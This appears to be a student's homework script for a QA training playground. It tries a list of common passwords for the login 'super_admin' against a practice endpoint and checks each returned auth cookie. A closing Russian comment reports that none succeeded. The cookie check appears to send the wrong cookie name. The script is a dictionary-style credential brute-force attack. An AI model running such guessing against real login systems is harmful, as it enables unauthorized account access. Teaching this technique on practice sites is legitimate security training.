import requests

main_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
list_passwords = ["123456", "123456789", "12345", "12345678", "qwerty",
                  "abc123", "12345678", "password", "abc123", "football", "12345", "1234567",
                  "monkey", "monkey", "111111", "1234567", "letmein", "111111", "1234", "football", "1234567890",
                  "letmein", "1234567", "12345", "dragon", "1234567", "baseball", "1234", "1234567", "1234567",
                  "sunshine", "iloveyou", "trustno1", "111111", "iloveyou", "dragon", "1234567", "princess", "football",
                  "qwerty", "dragon", "baseball", "adobe123", "football", "baseball", "1234", "iloveyou", "iloveyou",
                  "baseball", "iloveyou", "123123", "1234567", "welcome", "login", "admin", "princess", "abc123",
                  "trustno1", "monkey", "1234567890", "welcome", "welcome", "qwerty123",
                  "iloveyou", "1234567", "1234567890", "letmein", "abc123", "solo", "monkey", "welcome", "1q2w3e4r",
                  "master", "sunshine", "letmein", "abc123", "abc123", "login", "666666",
                  "sunshine", "master", "photoshop", "111111", "1qaz2wsx", "abc123", "abc123",
                  "qwertyuiop", "ashley", "123123", "1234", "mustang", "dragon", "121212", "starwars", "football",
                  "654321", "bailey", "welcome", "monkey", "access", "master", "flower", "123123", "123123", "555555",
                  "passw0rd", "shadow", "shadow", "shadow", "monkey", "passw0rd", "dragon", "monkey", "lovely",
                  "shadow", "ashley", "sunshine", "master", "letmein", "dragon", "passw0rd", "654321", "7777777",
                  "123123", "football", "12345", "michael", "login", "sunshine", "master", "!@#$%^&*", "welcome",
                  "654321", "jesus", "password1", "superman", "princess", "master", "hello", "charlie", "888888",
                  "superman", "michael", "princess", "696969", "qwertyuiop", "hottie", "freedom", "aa123456",
                  "princess", "qazwsx", "ninja", "azerty", "123123", "solo", "loveme", "whatever", "donald", "dragon",
                  "michael", "mustang", "trustno1", "batman", "passw0rd", "zaq1zaq1", "qazwsx", "password1",
                  "password1", "Football", "password1", "000000", "trustno1", "starwars", "password1", "trustno1",
                  "qwerty123", "123qwe", "123123"]

print(len(list_passwords))

for password in list_passwords:
    payload = '{"login": "super_admin", "password": "' + password + '"}'
    print(payload)
    response = requests.post(main_url, data=payload)
    my_cookies = response.cookies.get("auth_cookie")
    print(my_cookies)

    response_2 = requests.get(check_cookie, cookies={"cookie": my_cookies})
    if response_2.text == "You are authorized":
        print(password)
        print(response_2.text)
        break

# Перебрал все пароли, но правильного не оказалось, увы успешного ответа не получилось.
